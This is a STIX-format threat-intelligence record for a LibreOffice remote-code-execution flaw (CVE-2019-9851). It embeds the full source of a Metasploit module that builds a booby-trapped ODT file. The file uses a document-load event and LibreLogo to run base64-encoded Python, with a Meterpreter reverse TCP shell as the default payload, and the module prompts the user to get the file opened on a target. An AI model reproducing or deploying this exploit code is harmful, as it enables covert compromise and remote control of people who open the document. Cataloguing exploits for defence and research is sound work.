{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d340fd8-33e8-47d2-832b-ea81bdf5f786",
    "created": "2024-08-14T17:05:06.400672Z",
    "modified": "2024-08-14T17:05:06.400676Z",
    "name": "LibreOffice Macro Python Code Execution",
    "description": " LibreOffice comes bundled with sample macros written in Python and allows the ability to bind program events to them.  LibreLogo is a macro that allows a program event to execute text as Python code, allowing RCE.  This module generates an ODT file with a dom loaded event that when triggered, will execute arbitrary python code and the metasploit payload.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/libreoffice_logo_exec.rb",
            "external_id": "libreoffice_logo_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9851"
        },
        {
            "source_name": "reference",
            "url": "https://www.libreoffice.org/about-us/security/advisories/cve-2019-9848/"
        },
        {
            "source_name": "reference",
            "url": "https://www.libreoffice.org/about-us/security/advisories/cve-2019-9851/"
        },
        {
            "source_name": "reference",
            "url": "https://insinuator.net/2019/07/libreoffice-a-python-interpreter-code-execution-vulnerability-cve-2019-9848/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'LibreOffice Macro Python Code Execution',\n      'Description'     => %q{\n        LibreOffice comes bundled with sample macros written in Python and\n        allows the ability to bind program events to them.\n\n        LibreLogo is a macro that allows a program event to execute text as Python code, allowing RCE.\n\n        This module generates an ODT file with a dom loaded event that,\n        when triggered, will execute arbitrary python code and the metasploit payload.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Nils Emmerich',    # Vulnerability discovery and PoC\n          'Shelby Pace',      # Base module author (CVE-2018-16858), module reviewer and platform-independent code\n          'LoadLow',          # This msf module\n          'Gabriel Masei'     # Global events vuln. disclosure\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2019-9851' ],\n          [ 'URL', 'https://www.libreoffice.org/about-us/security/advisories/cve-2019-9848/' ],\n          [ 'URL', 'https://www.libreoffice.org/about-us/security/advisories/cve-2019-9851/' ],\n          [ 'URL', 'https://insinuator.net/2019/07/libreoffice-a-python-interpreter-code-execution-vulnerability-cve-2019-9848/' ]\n        ],\n      'DisclosureDate'  => '2019-07-16',\n      'Platform'        => 'python',\n      'Arch'            => ARCH_PYTHON,\n      'DefaultOptions'  => { 'Payload' => 'python/meterpreter/reverse_tcp' },\n      'Targets'         => [ ['Automatic', {}] ],\n      'DefaultTarget'   =>  0\n    ))\n\n    register_options(\n    [\n      OptString.new('FILENAME', [true, 'Output file name', 'librefile.odt']),\n      OptString.new('TEXT_CONTENT', [true, 'Text written in the document. It will be html encoded.', 'My Report']),\n    ])\n  end\n\n  def gen_file\n    text_content = Rex::Text.html_encode(datastore['TEXT_CONTENT'])\n    py_code = Rex::Text.encode_base64(payload.encoded)\n    @cmd = \"exec(eval(str(__import__('base64').b64decode('#{py_code}'))))\"\n    @cmd = Rex::Text.html_encode(@cmd)\n\n    fodt_file = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-9848', 'librefile.erb'))\n    libre_file = ERB.new(fodt_file).result(binding())\n\n    print_status(\"File generated! Now you need to move the odt file and find a way to send it/open it with LibreOffice on the target.\")\n\n    libre_file\n  rescue Errno::ENOENT\n    fail_with(Failure::NotFound, 'Cannot find template file')\n  end\n\n  def exploit\n    fodt_file = gen_file\n\n    file_create(fodt_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-16",
    "x_mitre_platforms": [
        "python'"
    ]
}